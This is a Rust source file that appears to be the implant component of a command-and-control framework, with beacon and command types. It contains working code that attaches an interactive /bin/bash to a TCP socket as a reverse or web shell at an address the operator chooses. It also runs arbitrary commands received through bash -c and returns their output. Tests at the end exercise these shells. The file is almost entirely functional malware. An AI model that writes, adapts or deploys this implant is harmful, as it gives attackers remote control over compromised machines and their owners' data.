use serde::{Deserialize, Serialize};
use std::net::{IpAddr, TcpStream};
use std::os::fd::OwnedFd;
use std::process::{Command as SystemCommand, Stdio};
use std::sync::mpsc;
use std::thread;

pub const WEBSHELL_ADDR: &str = "0.0.0.0:4444";

#[derive(Serialize, Deserialize, Debug)]
pub struct Beacon {
    pub id: u32,
    pub ip: IpAddr,
    pub hostname: String,
    pub commands: Vec<Command>,
}

#[derive(Serialize, Deserialize, Debug)]
pub enum CommandType {
    #[serde(rename = "webshell")]
    WebShell,
    #[serde(rename = "revshell")]
    RevShell,
    #[serde(rename = "run")]
    Run,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Command {
    pub id: u32,
    pub beacon_id: u32,
    #[serde(rename = "type")]
    pub c_type: CommandType,
    pub arg: String,
    #[serde(default)]
    pub executed: bool,
    #[serde(default)]
    pub result: String,
}

impl Command {
    pub fn run(&mut self) {
        match self.c_type {
            CommandType::WebShell => self.run_webshell(),
            CommandType::RevShell => self.run_revshell(),
            CommandType::Run => self.run_system(),
        };
        self.executed = true;
    }

    fn run_webshell(&mut self) {
        self.result = "Web".to_owned() + &Self::run_shell(WEBSHELL_ADDR.to_owned())
    }

    fn run_revshell(&mut self) {
        let addr: String = self.arg.to_owned();
        self.result = "Reverse ".to_owned() + &Self::run_shell(addr)
    }

    fn run_shell(addr: String) -> String {
        let (tx, rx) = mpsc::channel();
        thread::spawn(move || {
            let sock = match TcpStream::connect(addr) {
                Ok(sock) => {
                    tx.send(true).unwrap();
                    sock
                }
                _ => {
                    tx.send(false).unwrap();
                    return;
                }
            };
            let fd = OwnedFd::from(sock);
            SystemCommand::new("/bin/bash")
                .arg("-i")
                .stdin(Stdio::from(fd.try_clone().unwrap()))
                .stdout(Stdio::from(fd.try_clone().unwrap()))
                .stderr(Stdio::from(fd))
                .spawn()
                .unwrap()
                .wait()
                .unwrap_or_default();
            //tx.send(true).unwrap();
            //shell.wait().unwrap();
            //match shell {
            //    Ok(mut shell) => {
            //        tx.send(true).unwrap();
            //        shell.wait().unwrap();
            //    }
            //    Err(_) => {
            //        tx.send(false).unwrap();
            //    }
            //};
        });
        match rx.recv() {
            Ok(true) => "shell connection established".to_owned(),
            _ => "shell connection failed".to_owned(),
        }
    }

    fn run_system(&mut self) {
        let output = SystemCommand::new("bash")
            .arg("-c")
            .arg(self.arg.clone())
            .output()
            .unwrap();

        self.result = match output.status.code() {
            Some(0) => String::from_utf8(output.stdout).unwrap(),
            _ => {
                if output.stderr.is_empty() {
                    "Command failed without stderr".to_owned()
                } else {
                    String::from_utf8(output.stderr).unwrap()
                }
            }
        }
    }
}

#[cfg(test)]
mod c2command_test {
    use crate::Command;
    use crate::CommandType;

    #[test]
    fn test_commands() {
        let mut command1 = Command {
            id: 0,
            beacon_id: 0,
            c_type: CommandType::RevShell,
            arg: "0.0.0.0:8888".to_owned(),
            executed: false,
            result: "".to_owned(),
        };
        command1.run();
        assert!(!command1.result.is_empty());
        assert_eq!(command1.executed, true);

        let mut command2 = Command {
            id: 0,
            beacon_id: 0,
            c_type: CommandType::WebShell,
            arg: "".to_owned(),
            executed: false,
            result: "".to_owned(),
        };
        command2.run();
        assert!(!command2.result.is_empty());
        assert_eq!(command2.executed, true);

        let mut command3 = Command {
            id: 0,
            beacon_id: 0,
            c_type: CommandType::Run,
            arg: "pwd".to_owned(),
            executed: false,
            result: "".to_owned(),
        };
        command3.run();
        assert!(!command3.result.is_empty());
        assert_eq!(command3.executed, true);
    }
}
